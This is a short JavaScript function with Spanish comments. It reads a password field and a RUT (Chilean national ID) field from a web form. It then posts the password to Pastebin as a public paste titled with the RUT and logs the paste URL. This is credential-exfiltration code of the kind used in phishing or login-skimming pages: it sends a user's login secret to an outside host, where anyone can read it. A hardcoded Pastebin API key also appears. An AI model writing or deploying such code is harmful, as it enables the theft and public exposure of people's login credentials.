function rescatarInputs() {
          var inputPassword = document.getElementById("inputPassword").value;
          var inputRut = document.getElementById("inputRut").value;
// Reemplazar con tu clave de API de Pastebin y clave de usuario
            const apiKey = 'Z8rs0HMoKTuO4rc_5o1oRtNVXeGiVPgM';
            const userApiKey = 'TU_CLAVE_DE_USUARIO_DE_PASTEBIN';

            // Datos para ser enviados
            const postData = {
                api_dev_key: apiKey,
                api_paste_code: inputPassword,
                api_paste_private: 0,  // 0 para público, 1 para no listado, 2 para privado
                api_paste_name: inputRut,
                api_paste_expire_date: '1H',  // Caducidad del pegado, por ejemplo, 10M (10 minutos), 1H (1 hora)
            };

            // URL del punto final de la API
            const apiUrl = 'https://pastebin.com/api/api_post.php';

            // Realizar la solicitud POST
            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: Object.keys(postData)
                    .map((key) => encodeURIComponent(key) + '=' + encodeURIComponent(postData[key]))
                    .join('&'),
            })
                .then((response) => response.text())
                .then((data) => {
                    console.log('Pegado creado exitosamente. Aquí está la URL del pegado:');
                    console.log(data);
                })
                .catch((error) => {
                    console.error('Error al crear el pegado:', error);
                });
          alert(inputPassword+" - "+inputRut)
          // Aquí puedes realizar más acciones con estos valores, como enviarlos a un servidor o manipularlos de alguna otra manera.
        }